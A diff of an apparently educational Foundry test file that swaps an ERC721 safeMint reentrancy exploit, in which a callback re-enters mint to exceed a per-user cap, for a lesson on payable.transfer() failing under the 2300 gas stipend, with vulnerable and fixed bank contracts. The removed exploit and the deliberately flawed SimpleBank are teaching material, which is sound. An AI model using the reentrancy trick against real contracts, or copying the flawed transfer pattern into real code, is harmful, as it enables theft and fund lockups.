@@ -2,75 +2,96 @@
 pragma solidity ^0.8.18;
 
 import "forge-std/Test.sol";
-import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
 
 /*
-Name: Unprotected callback - ERC721 SafeMint reentrancy
+Name: Incorrect use of payable.transfer()
 
 Description:
-The contract ContractTest is exploiting a callback feature to bypass the maximum mint limit 
-set by the MaxMint721 contract. This is achieved by triggering the onERC721Received function,
-which internally calls the mint function again. Therefore, although MaxMint721 attempts 
-to limit the number of tokens that a user can mint to MAX_PER_USER, the ContractTest contract 
-successfully mints more tokens than this limit. 
+After the implementation of EIP 1884 in the Istanbul hard fork, 
+the gas cost of the SLOAD operation was increased, 
+resulting in the breaking of some existing smart contracts.
 
-Scenario:
-This excersise is about a contract that via callback function to mint more NFTs
+When transferring ETH to recipients, if Solidity's transfer() or send() method 
+is used, certain shortcomings arise, particularly when the recipient 
+is a smart contract. These shortcomings can make it impossible to 
+successfully transfer ETH to the smart contract recipient.
 
-Mitigation:
-Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.
+Specifically, the transfer will inevitably fail when the smart contract:
+    1.does not implement a payable fallback function, or
+    2.implements a payable fallback function which would incur more than 2300 gas units, or
+    3.implements a payable fallback function incurring less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300.
 
-REF
-https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a
-https://www.paradigm.xyz/2021/08/the-dangers-of-surprising-code
+Mitigation:  
+Using call with its returned boolean checked in combination with re-entrancy guard is highly recommended.
 
+REF:
+https://twitter.com/1nf0s3cpt/status/1678958093273829376
+https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/
+https://github.com/code-423n4/2022-12-escher-findings/issues/99
 */
 
 contract ContractTest is Test {
-    MaxMint721 MaxMint721Contract;
-    bool complete;
-    uint256 maxMints = 10;
-    address alice = vm.addr(1);
-    address eve = vm.addr(2);
+    SimpleBank SimpleBankContract;
+    FixedSimpleBank FixedSimpleBankContract;
 
-    function testSafeMint() public {
-        MaxMint721Contract = new MaxMint721();
-        MaxMint721Contract.mint(maxMints);
-        console.log("Bypassed maxMints, we got 19 NFTs");
-        assertEq(MaxMint721Contract.balanceOf(address(this)), 19);
-        console.log("NFT minted:", MaxMint721Contract.balanceOf(address(this)));
+    function setUp() public {
+        SimpleBankContract = new SimpleBank();
+        FixedSimpleBankContract = new FixedSimpleBank();
     }
 
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes memory
-    ) public returns (bytes4) {
-        if (!complete) {
-            complete = true;
-            MaxMint721Contract.mint(maxMints - 1);
-            console.log("Called with :", maxMints - 1);
-        }
-        return this.onERC721Received.selector;
+    function testTransferFail() public {
+        SimpleBankContract.deposit{value: 1 ether}();
+        assertEq(SimpleBankContract.getBalance(), 1 ether);
+        vm.expectRevert();
+        SimpleBankContract.withdraw(1 ether);
     }
 
-    receive() external payable {}
+    function testCall() public {
+        FixedSimpleBankContract.deposit{value: 1 ether}();
+        assertEq(FixedSimpleBankContract.getBalance(), 1 ether);
+        FixedSimpleBankContract.withdraw(1 ether);
+    }
+
+    receive() external payable {
+        //just a example for out of gas
+        SimpleBankContract.deposit{value: 1 ether}();
+    }
 }
 
-contract MaxMint721 is ERC721Enumerable {
-    uint256 public MAX_PER_USER = 10;
+contract SimpleBank {
+    mapping(address => uint) private balances;
 
-    constructor() ERC721("ERC721", "ERC721") {}
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
 
-    function mint(uint256 amount) external {
-        require(
-            balanceOf(msg.sender) + amount <= MAX_PER_USER,
-            "exceed max per user"
-        );
-        for (uint256 i = 0; i < amount; i++) {
-            uint256 mintIndex = totalSupply();
-            _safeMint(msg.sender, mintIndex);
-        }
+    function getBalance() public view returns (uint) {
+        return balances[msg.sender];
+    }
+
+    function withdraw(uint amount) public {
+        require(balances[msg.sender] >= amount);
+        balances[msg.sender] -= amount;
+        // the issue is here
+        payable(msg.sender).transfer(amount);
+    }
+}
+
+contract FixedSimpleBank {
+    mapping(address => uint) private balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function getBalance() public view returns (uint) {
+        return balances[msg.sender];
+    }
+
+    function withdraw(uint amount) public {
+        require(balances[msg.sender] >= amount);
+        balances[msg.sender] -= amount;
+        (bool success, ) = payable(msg.sender).call{value: amount}("");
+        require(success, " Transfer of ETH Failed");
     }
 }
